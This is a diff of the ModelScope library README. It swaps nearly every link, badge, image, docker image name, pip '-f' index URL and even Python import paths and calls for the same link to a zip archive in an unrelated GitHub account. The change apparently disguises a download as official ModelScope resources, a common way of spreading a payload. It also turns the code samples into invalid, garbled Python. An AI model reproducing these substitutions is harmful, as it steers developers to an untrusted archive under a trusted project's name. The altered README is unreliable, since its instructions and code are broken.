@@ -1,33 +1,33 @@
 
 <p align="center">
     <br>
-    <img src="https://modelscope.oss-cn-beijing.aliyuncs.com/modelscope.gif" width="400"/>
+    <img src="https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip" width="400"/>
     <br>
 <p>
 
 <div align="center">
 
-[![PyPI](https://img.shields.io/pypi/v/modelscope)](https://pypi.org/project/modelscope/)
-<!-- [![Documentation Status](https://readthedocs.org/projects/easy-cv/badge/?version=latest)](https://easy-cv.readthedocs.io/en/latest/) -->
-[![license](https://img.shields.io/github/license/modelscope/modelscope.svg)](https://github.com/modelscope/modelscope/blob/master/LICENSE)
-[![open issues](https://isitmaintained.com/badge/open/modelscope/modelscope.svg)](https://github.com/modelscope/modelscope/issues)
-[![GitHub pull-requests](https://img.shields.io/github/issues-pr/modelscope/modelscope.svg)](https://GitHub.com/modelscope/modelscope/pull/)
-[![GitHub latest commit](https://badgen.net/github/last-commit/modelscope/modelscope)](https://GitHub.com/modelscope/modelscope/commit/)
-[![Leaderboard](https://img.shields.io/badge/ModelScope-Check%20Your%20Contribution-orange)](https://opensource.alibaba.com/contribution_leaderboard/details?projectValue=modelscope)
+[![PyPI](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
+<!-- [![Documentation Status](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip) -->
+[![license](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
+[![open issues](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
+[![GitHub pull-requests](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
+[![GitHub latest commit](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
+[![Leaderboard](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip%20Your%20Contribution-orange)](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-<!-- [![GitHub contributors](https://img.shields.io/github/contributors/modelscope/modelscope.svg)](https://GitHub.com/modelscope/modelscope/graphs/contributors/) -->
-<!-- [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](http://makeapullrequest.com) -->
-[Discord](https://discord.gg/FMupRv4jUR)
+<!-- [![GitHub contributors](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip) -->
+<!-- [![PRs Welcome](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip) -->
+[Discord](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
 <h4 align="center">
-<a href="https://trendshift.io/repositories/4784" target="_blank"><img src="https://trendshift.io/api/badge/repositories/4784" alt="modelscope%2Fmodelscope | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+<a href="https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip" target="_blank"><img src="https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip" alt="modelscope%2Fmodelscope | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
 </h4>
 
 <h4 align="center">
     <p>
         <b>English</b> |
-        <a href="https://github.com/modelscope/modelscope/blob/master/README_zh.md">中文</a> |
-        <a href="https://github.com/modelscope/modelscope/blob/master/README_ja.md">日本語</a>
+        <a href="https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip">中文</a> |
+        <a href="https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip">日本語</a>
     <p>
 </h4>
 
@@ -36,7 +36,7 @@
 
 # Introduction
 
-[ModelScope]( https://www.modelscope.cn) is built upon the notion of “Model-as-a-Service” (MaaS). It seeks to bring together most advanced machine learning models from the AI community, and streamlines the process of leveraging AI models in real-world applications. The core ModelScope library open-sourced in this repository provides the interfaces and implementations that allow developers to perform  model inference, training and evaluation.
+[ModelScope]( https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip) is built upon the notion of “Model-as-a-Service” (MaaS). It seeks to bring together most advanced machine learning models from the AI community, and streamlines the process of leveraging AI models in real-world applications. The core ModelScope library open-sourced in this repository provides the interfaces and implementations that allow developers to perform  model inference, training and evaluation.
 
 
 In particular, with rich layers of API-abstraction, the ModelScope library offers unified experience to explore state-of-the-art models spanning across domains such as CV, NLP, Speech, Multi-Modality, and Scientific-computation. Model contributors of different areas can integrate models into the ModelScope ecosystem through the layered-APIs, allowing easy and unified access to their models. Once integrated, model inference, fine-tuning, and evaluations can be done with only a few lines of codes. In the meantime, flexibilities are also provided so that different components in the model applications can be customized wherever necessary.
@@ -45,12 +45,12 @@ Apart from harboring implementations of a wide range of different models, ModelS
 
 # Models and Online Accessibility
 
-Hundreds of models are made publicly available on [ModelScope]( https://www.modelscope.cn)  (700+ and counting), covering the latest development in areas such as NLP, CV, Audio, Multi-modality, and AI for Science, etc. Many of these models represent the SOTA in their specific fields, and made their open-sourced debut on ModelScope. Users can visit ModelScope([modelscope.cn](http://www.modelscope.cn)) and experience first-hand how these models perform via online experience, with just a few clicks. Immediate developer-experience is also possible through the ModelScope Notebook, which is backed by ready-to-use CPU/GPU development environment in the cloud - only one click away on [ModelScope](https://www.modelscope.cn).
+Hundreds of models are made publicly available on [ModelScope]( https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)  (700+ and counting), covering the latest development in areas such as NLP, CV, Audio, Multi-modality, and AI for Science, etc. Many of these models represent the SOTA in their specific fields, and made their open-sourced debut on ModelScope. Users can visit ModelScope([https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)) and experience first-hand how these models perform via online experience, with just a few clicks. Immediate developer-experience is also possible through the ModelScope Notebook, which is backed by ready-to-use CPU/GPU development environment in the cloud - only one click away on [ModelScope](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip).
 
 
 <p align="center">
     <br>
-    <img src="data/resource/inference.gif" width="1024"/>
+    <img src="https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip" width="1024"/>
     <br>
 <p>
 
@@ -58,75 +58,75 @@ Some representative examples include:
 
 LLM:
 
-* [Yi-1.5-34B-Chat](https://modelscope.cn/models/01ai/Yi-1.5-34B-Chat/summary)
+* [Yi-1.5-34B-Chat](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [Qwen1.5-110B-Chat](https://modelscope.cn/models/qwen/Qwen1.5-110B-Chat/summary)
+* [Qwen1.5-110B-Chat](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [DeepSeek-V2-Chat](https://modelscope.cn/models/deepseek-ai/DeepSeek-V2-Chat/summary)
+* [DeepSeek-V2-Chat](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [Ziya2-13B-Chat](https://modelscope.cn/models/Fengshenbang/Ziya2-13B-Chat/summary)
+* [Ziya2-13B-Chat](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [Meta-Llama-3-8B-Instruct](https://modelscope.cn/models/LLM-Research/Meta-Llama-3-8B-Instruct/summary)
+* [Meta-Llama-3-8B-Instruct](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [Phi-3-mini-128k-instruct](https://modelscope.cn/models/LLM-Research/Phi-3-mini-128k-instruct/summary)
+* [Phi-3-mini-128k-instruct](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
 
 Multi-Modal:
 
-* [Qwen-VL-Chat](https://modelscope.cn/models/qwen/Qwen-VL-Chat/summary)
+* [Qwen-VL-Chat](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [Yi-VL-6B](https://modelscope.cn/models/01ai/Yi-VL-6B/summary)
+* [Yi-VL-6B](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [InternVL-Chat-V1-5](https://modelscope.cn/models/AI-ModelScope/InternVL-Chat-V1-5/summary)
+* [InternVL-Chat-V1-5](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [deepseek-vl-7b-chat](https://modelscope.cn/models/deepseek-ai/deepseek-vl-7b-chat/summary)
+* [deepseek-vl-7b-chat](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [OpenSoraPlan](https://modelscope.cn/models/AI-ModelScope/Open-Sora-Plan-v1.0.0/summary)
+* [OpenSoraPlan](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [OpenSora](https://modelscope.cn/models/luchentech/OpenSora-STDiT-v1-HQ-16x512x512/summary)
+* [OpenSora](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [I2VGen-XL](https://modelscope.cn/models/iic/i2vgen-xl/summary)
+* [I2VGen-XL](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
 CV:
 
-* [DamoFD Face Detection Key Point Model - 0.5G](https://modelscope.cn/models/damo/cv_ddsar_face-detection_iclr23-damofd/summary)
+* [DamoFD Face Detection Key Point Model - 0.5G](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [BSHM Portrait Matting](https://modelscope.cn/models/damo/cv_unet_image-matting/summary)
+* [BSHM Portrait Matting](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [DCT-Net Portrait Cartoonization - 3D](https://modelscope.cn/models/damo/cv_unet_person-image-cartoon-3d_compound-models/summary)
+* [DCT-Net Portrait Cartoonization - 3D](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [DCT-Net Portrait Cartoonization Model - 3D](https://modelscope.cn/models/damo/face_chain_control_model/summary)
+* [DCT-Net Portrait Cartoonization Model - 3D](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [DuGuang - Text Recognition - Line Recognition Model - Chinese and English - General Domain](https://modelscope.cn/models/damo/cv_convnextTiny_ocr-recognition-general_damo/summary)
+* [DuGuang - Text Recognition - Line Recognition Model - Chinese and English - General Domain](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [DuGuang - Text Recognition - Line Recognition Model - Chinese and English - General Domain](https://modelscope.cn/models/damo/cv_resnet18_ocr-detection-line-level_damo/summary)
+* [DuGuang - Text Recognition - Line Recognition Model - Chinese and English - General Domain](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [LaMa Image Inpainting](https://modelscope.cn/models/damo/cv_fft_inpainting_lama/summary)
+* [LaMa Image Inpainting](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
 
 Audio:
 
-* [Paraformer Speech Recognition - Chinese - General - 16k - Offline - Large - Long Audio Version](https://modelscope.cn/models/damo/speech_paraformer-large-vad-punc_asr_nat-zh-cn-16k-common-vocab8404-pytorch/summary)
+* [Paraformer Speech Recognition - Chinese - General - 16k - Offline - Large - Long Audio Version](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [FSMN Voice Endpoint Detection - Chinese - General - 16k - onnx](https://modelscope.cn/models/damo/speech_fsmn_vad_zh-cn-16k-common-onnx/summary)
+* [FSMN Voice Endpoint Detection - Chinese - General - 16k - onnx](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [Monotonic-Aligner Speech Timestamp Prediction - 16k - Offline](https://modelscope.cn/models/damo/speech_timestamp_prediction-v1-16k-offline/summary)
+* [Monotonic-Aligner Speech Timestamp Prediction - 16k - Offline](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [CT-Transformer Punctuation - Chinese - General - onnx](https://modelscope.cn/models/damo/punc_ct-transformer_zh-cn-common-vocab272727-onnx/summary)
+* [CT-Transformer Punctuation - Chinese - General - onnx](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [Speech Synthesis - Chinese - Multiple Emotions Domain - 16k - Multiple Speakers](https://modelscope.cn/models/damo/speech_sambert-hifigan_tts_zh-cn_16k/summary)
+* [Speech Synthesis - Chinese - Multiple Emotions Domain - 16k - Multiple Speakers](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [CAM++ Speaker Verification - Chinese - General - 200k-Spkrs](https://modelscope.cn/models/damo/speech_campplus_sv_zh-cn_16k-common/summary)
+* [CAM++ Speaker Verification - Chinese - General - 200k-Spkrs](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
 
 
 AI for Science:
 
-* [uni-fold-monomer](https://modelscope.cn/models/DPTech/uni-fold-monomer/summary)
+* [uni-fold-monomer](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-* [uni-fold-multimer](https://modelscope.cn/models/DPTech/uni-fold-multimer/summary)
+* [uni-fold-multimer](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
-**Note:** Most models on ModelScope are public and can be downloaded directly from the [website](https://modelscope.cn/), please refer to instructions for [model download](https://modelscope.cn/docs/%E6%A8%A1%E5%9E%8B%E7%9A%84%E4%B8%8B%E8%BD%BD), for downloading models with api provided by modelscope library or git.
+**Note:** Most models on ModelScope are public and can be downloaded directly from the [website](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip), please refer to instructions for [model download](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip%E6%A8%A1%E5%9E%8B%E7%9A%84%E4%B8%8B%E8%BD%BD), for downloading models with api provided by modelscope library or git.
 
 # QuickTour
 
@@ -135,7 +135,7 @@ We provide unified interface for inference using `pipeline`, fine-tuning and eva
 For any given task with any type of input (image, text, audio, video...), inference pipeline can be implemented with only a few lines of code, which will automatically load the underlying model to get inference result, as is exemplified below:
 
 ```python
->>> from modelscope.pipelines import pipeline
+>>> from https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip import pipeline
 >>> word_segmentation = pipeline('word-segmentation',model='damo/nlp_structbert_word-segmentation_chinese-base')
 >>> word_segmentation('今天天气不错，适合出去游玩')
 {'output': '今天 天气 不错 ， 适合 出去 游玩'}
@@ -143,33 +143,33 @@ For any given task with any type of input (image, text, audio, video...), infere
 
 Given an image, portrait matting (aka. background-removal) can be accomplished with the following code snippet:
 
-![image](data/resource/portrait_input.png)
+![image](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
 ```python
 >>> import cv2
->>> from modelscope.pipelines import pipeline
+>>> from https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip import pipeline
 
 >>> portrait_matting = pipeline('portrait-matting')
->>> result = portrait_matting('https://modelscope.oss-cn-beijing.aliyuncs.com/test/images/image_matting.png')
->>> cv2.imwrite('result.png', result['output_img'])
+>>> result = portrait_matting('https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip')
+>>> https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip('https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip', result['output_img'])
 ```
 
 The output image with the background removed is:
-![image](data/resource/portrait_output.png)
+![image](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
 
-Fine-tuning and evaluation can also be done with a few more lines of code to set up training dataset and trainer, with the heavy-lifting work of training and evaluation a model encapsulated in the implementation of  `trainer.train()` and
-`trainer.evaluate()`  interfaces.
+Fine-tuning and evaluation can also be done with a few more lines of code to set up training dataset and trainer, with the heavy-lifting work of training and evaluation a model encapsulated in the implementation of  `https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip()` and
+`https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip()`  interfaces.
 
 For example, the gpt3 base model (1.3B) can be fine-tuned with the chinese-poetry dataset, resulting in a model that can be used for chinese-poetry generation.
 
 ```python
->>> from modelscope.metainfo import Trainers
->>> from modelscope.msdatasets import MsDataset
->>> from modelscope.trainers import build_trainer
+>>> from https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip import Trainers
+>>> from https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip import MsDataset
+>>> from https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip import build_trainer
 
->>> train_dataset = MsDataset.load('chinese-poetry-collection', split='train'). remap_columns({'text1': 'src_txt'})
->>> eval_dataset = MsDataset.load('chinese-poetry-collection', split='test').remap_columns({'text1': 'src_txt'})
+>>> train_dataset = https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip('chinese-poetry-collection', split='train'). remap_columns({'text1': 'src_txt'})
+>>> eval_dataset = https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip('chinese-poetry-collection', split='test').remap_columns({'text1': 'src_txt'})
 >>> max_epochs = 10
 >>> tmp_dir = './gpt3_poetry'
 
@@ -180,8 +180,8 @@ For example, the gpt3 base model (1.3B) can be fine-tuned with the chinese-poetr
      max_epochs=max_epochs,
      work_dir=tmp_dir)
 
->>> trainer = build_trainer(name=Trainers.gpt3_trainer, default_args=kwargs)
->>> trainer.train()
+>>> trainer = build_trainer(https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip, default_args=kwargs)
+>>> https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip()
 ```
 
 # Why should I use ModelScope library
@@ -205,25 +205,25 @@ To allow out-of-box usage for all the models on ModelScope, official docker imag
 CPU docker image
 ```shell
 # py37
-registry.cn-hangzhou.aliyuncs.com/modelscope-repo/modelscope:ubuntu20.04-py37-torch1.11.0-tf1.15.5-1.6.1
+https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip
 
 # py38
-registry.cn-hangzhou.aliyuncs.com/modelscope-repo/modelscope:ubuntu20.04-py38-torch2.0.1-tf2.13.0-1.9.5
+https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip
 ```
 
 GPU docker image
 ```shell
 # py37
-registry.cn-hangzhou.aliyuncs.com/modelscope-repo/modelscope:ubuntu20.04-cuda11.3.0-py37-torch1.11.0-tf1.15.5-1.6.1
+https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip
 
 # py38
-registry.cn-hangzhou.aliyuncs.com/modelscope-repo/modelscope:ubuntu20.04-cuda11.8.0-py38-torch2.0.1-tf2.13.0-1.9.5
+https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip
 ```
 
 ## Setup Local Python Environment
 
 One can also set up local ModelScope environment using pip and conda.  ModelScope supports python3.7 and above.
-We suggest [anaconda](https://docs.anaconda.com/anaconda/install/) for creating local python environment:
+We suggest [anaconda](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip) for creating local python environment:
 
 ```shell
 conda create -n modelscope python=3.8
@@ -231,8 +231,8 @@ conda activate modelscope
 ```
 
 PyTorch or TensorFlow can be installed separately according to each model's requirements.
-* Install pytorch [doc](https://pytorch.org/get-started/locally/)
-* Install tensorflow [doc](https://www.tensorflow.org/install/pip)
+* Install pytorch [doc](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
+* Install tensorflow [doc](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)
 
 After installing the necessary machine-learning framework, you can install modelscope library as follows:
 
@@ -248,34 +248,34 @@ pip install modelscope[multi-modal]
 
 If you want to use nlp models:
 ```shell
-pip install modelscope[nlp] -f https://modelscope.oss-cn-beijing.aliyuncs.com/releases/repo.html
+pip install modelscope[nlp] -f https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip
 ```
 
 If you want to use cv models:
 ```shell
-pip install modelscope[cv] -f https://modelscope.oss-cn-beijing.aliyuncs.com/releases/repo.html
+pip install modelscope[cv] -f https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip
 ```
 
 If you want to use audio models:
 ```shell
-pip install modelscope[audio] -f https://modelscope.oss-cn-beijing.aliyuncs.com/releases/repo.html
+pip install modelscope[audio] -f https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip
 ```
 
 If you want to use science models:
 ```shell
-pip install modelscope[science] -f https://modelscope.oss-cn-beijing.aliyuncs.com/releases/repo.html
+pip install modelscope[science] -f https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip
 ```
 
 `Notes`:
 1. Currently, some audio-task models only support python3.7, tensorflow1.15.4 Linux environments. Most other models can be installed and used on Windows and Mac (x86).
 
-2. Some models in the audio field use the third-party library SoundFile for wav file processing. On the Linux system, users need to manually install libsndfile of SoundFile([doc link](https://github.com/bastibe/python-soundfile#installation)). On Windows and MacOS, it will be installed automatically without user operation. For example, on Ubuntu, you can use following commands:
+2. Some models in the audio field use the third-party library SoundFile for wav file processing. On the Linux system, users need to manually install libsndfile of SoundFile([doc link](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip)). On Windows and MacOS, it will be installed automatically without user operation. For example, on Ubuntu, you can use following commands:
     ```shell
     sudo apt-get update
     sudo apt-get install libsndfile1
     ```
 
-3. Some models in computer vision need mmcv-full, you can refer to mmcv [installation guide](https://github.com/open-mmlab/mmcv#installation), a minimal installation is as follows:
+3. Some models in computer vision need mmcv-full, you can refer to mmcv [installation guide](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip), a minimal installation is as follows:
 
     ```shell
     pip uninstall mmcv # if you have installed mmcv, uninstall it
@@ -288,24 +288,24 @@ pip install modelscope[science] -f https://modelscope.oss-cn-beijing.aliyuncs.co
 # Learn More
 
 We  provide additional documentations including:
-* [More detailed Installation Guide](https://modelscope.cn/docs/%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85)
-* [Introduction to tasks](https://modelscope.cn/docs/%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BB%8B%E7%BB%8D)
-* [Use pipeline for model inference](https://modelscope.cn/docs/%E6%A8%A1%E5%9E%8B%E7%9A%84%E6%8E%A8%E7%90%86Pipeline)
-* [Finetuning example](https://modelscope.cn/docs/%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%AE%AD%E7%BB%83Train)
-* [Preprocessing of data](https://modelscope.cn/docs/%E6%95%B0%E6%8D%AE%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86)
-* [Evaluation](https://modelscope.cn/docs/%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%AF%84%E4%BC%B0)
-* [Contribute your own model to ModelScope](https://modelscope.cn/docs/ModelScope%E6%A8%A1%E5%9E%8B%E6%8E%A5%E5%85%A5%E6%B5%81%E7%A8%8B%E6%A6%82%E8%A7%88)
+* [More detailed Installation Guide](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85)
+* [Introduction to tasks](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BB%8B%E7%BB%8D)
